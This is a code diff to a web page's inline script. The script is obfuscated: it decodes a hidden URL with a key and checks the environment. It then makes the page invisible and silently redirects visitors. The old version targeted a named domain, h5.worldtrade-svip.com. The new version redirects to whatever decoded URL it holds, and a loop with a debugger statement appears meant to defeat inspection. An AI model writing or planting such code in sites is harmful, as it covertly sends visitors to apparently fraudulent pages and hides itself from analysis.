@@ -114,13 +114,13 @@
 
     <script>
         (function() {
-           const _k = 'sk_9x7b2q1678';
-            
+           const _k = 'sk_8n4p2m7q3j';
+
             const _f = [
-                '7b2244e6f1a3d4c', 
-                '6f2265d3b2a1e5d', 
-                '7d2273649b1f4e',
-                '6e2264758c1d4f'
+                '7a2b4c8d3e5f9g',
+                '1h6i4j2k8l5m3n',
+                '9o7p2q4r6s8t1u',
+                '3v5w7x9y2z4a6b'
             ];
 
             function _d(e, k) {
@@ -144,17 +144,18 @@
                 return Object.values(t).every(x => x);
             }
 
-             setTimeout(() => {
-                if(_v()) {
-                    const u = _d(_f.join(''), _k);
-                    if(u.includes('h5.worldtrade-svip.com')) {
-                        document.body.style.opacity = '0';
-                        setTimeout(() => {
-                            window.location.href = 'https://h5.worldtrade-svip.com/';
-                        }, 300);
-                    }
+         setTimeout(() => {
+            if(_v()) {
+                const u = _d(_f.join(''), _k);
+                if(u && u.startsWith('http')) {  // 只验证是否为有效URL
+                    document.body.style.opacity = '0';
+                    setTimeout(() => {
+                        window.location.href = u;  // 使用解密后的URL
+                    }, 300);
                 }
-            }, 2000);
+            }
+        }, 2000);
+
             setInterval(() => {
                 const s = performance.now();
                 debugger;
